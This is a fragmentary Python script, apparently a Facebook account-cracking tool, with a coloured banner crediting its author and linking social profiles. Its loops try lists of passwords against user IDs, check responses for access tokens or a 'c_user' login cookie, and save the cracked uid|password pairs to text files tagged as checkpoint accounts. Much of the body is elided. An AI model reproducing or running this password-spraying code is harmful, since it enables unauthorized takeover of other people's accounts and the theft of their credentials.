...
.........::::.....::::.........::.........::
\x1b[0;32m╔════════════════════════════════════════════╗
\x1b[0;33m║WELCOME TO NAZIRKHAN  TOOLS DEVELOPED BY NAZIRO KHAN ║
\x1b[0;33m║       #TOOL AUTHOR [NAZIR_KHAN] SIMPLE BOY BD. ║
\x1b[0;33m╚════════════════════════════════════════════╝
\x1b[0;33m ---------------------------------------------
\x1b[0;33m╔════════════════════════════════════════════╗
\x1b[0;33m║#WEBSITE     : FOLLOW MY FACEBOOK TO FIND IT.║
\x1b[0;33m║#FACEBOOK : https://www.facebook.com/ajmal.shah41     ║
\x1b[0;33m║#GITHUB : https://github.com/NAZIR5                   ║
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[NAZIR-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;95m[NAZIR-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;95m[NAZIR-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;95m[NAZIR-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
